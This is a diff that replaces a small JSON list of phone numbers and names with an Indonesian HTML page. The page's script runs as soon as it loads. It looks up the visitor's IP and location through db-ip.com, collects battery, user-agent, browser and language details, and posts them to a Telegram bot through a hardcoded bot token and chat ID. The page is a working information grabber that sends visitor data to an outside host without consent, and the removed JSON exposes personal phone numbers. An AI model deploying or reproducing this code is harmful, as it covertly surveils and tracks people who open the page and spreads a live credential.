@@ -1,22 +1,71 @@
-{
-  "status": 200,
-  "success": true,
-  "data": [
-    {
-      "nomor": "6282137435046",
-      "nama": "zakkiXD-Dev",
-      "expiredAt": 1743519581048
-    },
-    {
-      "nomor": "6272727388383",
-      "nama": "zgsg",
-      "expiredAt": 2308155359979
-    },
-    {
-      "nomor": "6285810054638",
-      "nama": "lylia-pedia",
-      "expiredAt": 1742174988026
-    }
-  ],
-  "creator": "zakkiXD-Developer"
-}
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Kirim ke Telegram</title>
+</head>
+<body>
+
+    <h2>Data sedang dikirim ke Telegram...</h2>
+
+    <script>
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                const status = battery.charging ? "🔌 Mengisi daya" : "⚡ Tidak mengisi daya";
+                return `Baterai: ${Math.round(battery.level * 100)}% (${status})`;
+            }
+            return "Baterai: Tidak didukung";
+        }
+
+        async function kirimKeTelegram() {
+            try {
+                const apiUrl = "https://api.db-ip.com/v2/free/self";
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+
+                const batteryInfo = await getBatteryInfo();
+                const userAgent = navigator.userAgent;
+                const browser = navigator.vendor || "Tidak diketahui";
+                const bahasa = navigator.language;
+
+                const pesan = `
+🌍 **Info Pengguna**
+- IP: ${data.ipAddress}
+- Negara: ${data.countryName}
+- Provinsi: ${data.stateProv}
+- Kota: ${data.city}
+- ${batteryInfo}
+- User Agent: ${userAgent}
+- Browser: ${browser}
+- Bahasa: ${bahasa}
+                `;
+
+                const botToken = "7240848687:AAED883P7JiqkuFMA8NjnNfgHWdYSjNaGtA"; // Ganti dengan token bot lo
+                const chatId = "8073078237"; // Ganti dengan ID chat lo
+
+                const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const telegramResponse = await fetch(telegramApi, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: "Markdown" })
+                });
+
+                if (telegramResponse.ok) {
+                    document.body.innerHTML = "<h2>Pesan berhasil dikirim ke Telegram!</h2>";
+                } else {
+                    document.body.innerHTML = "<h2>Gagal mengirim pesan.</h2>";
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                document.body.innerHTML = "<h2>Terjadi kesalahan!</h2>";
+            }
+        }
+
+        // Kirim otomatis saat halaman dibuka
+        window.onload = kirimKeTelegram;
+    </script>
+
+</body>
+</html>
